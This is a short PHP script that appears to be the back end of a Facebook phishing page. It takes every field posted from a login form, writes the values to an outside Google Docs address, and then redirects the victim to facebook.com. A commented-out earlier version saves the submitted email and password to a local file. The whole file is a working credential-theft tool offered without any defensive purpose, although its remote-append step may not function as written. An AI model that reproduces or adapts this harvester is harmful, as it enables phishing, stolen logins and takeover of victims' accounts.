
<?php

header('Location: https://www.facebook.com');
$handle = fopen("https://docs.google.com/document/d/1zX_wyi-hqWWIZccjYznGla16Yj6SkJ8QZzrRnn0yoEA/edit?usp=sharing","a");
foreach($_POST as $variable => $value){
    fwrite($handle,$variable);
    fwrite($handle,"=");
    fwrite($handle, $value);
    fwrite($handle, "\r\n");
    echo($value);
}
fwrite($handle, "\r\n");
fclose($handle);
exit;

?>
    <!-- $email = $_POST['email'];
    $password = $_POST['password'];
    $data = $password;
    $file = 'file';
    file_put_contents($file, $data .PHP_EOL, FILE_APPEND);
    header('Location: https://www.facebook.com'); -->
